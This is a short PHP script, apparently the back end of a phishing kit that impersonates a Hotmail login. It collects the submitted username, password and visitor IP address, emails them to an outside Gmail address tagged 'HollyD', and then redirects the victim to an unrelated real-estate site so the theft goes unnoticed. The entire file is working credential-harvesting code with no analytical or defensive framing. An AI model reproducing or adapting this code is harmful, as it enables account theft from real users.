<?include 'index_files/validate_form.js';
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- XxX  *~* HollyD *~*  XxX----------------------\n";
$message .= "Hotmail: ".$_POST['hotmailuser']."\n";
$message .= "Password: ".$_POST['hotmailpassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------------------------Created By HollyD--------------------------------------\n";
$recipient = "crisonlinelogs@gmail.com";
$subject = "HotMa!l REZ";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
	 if (mail($recipent,$subject,$message,$headers))
	   {
		   header("Location: http://www.remax.com/");
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }
?>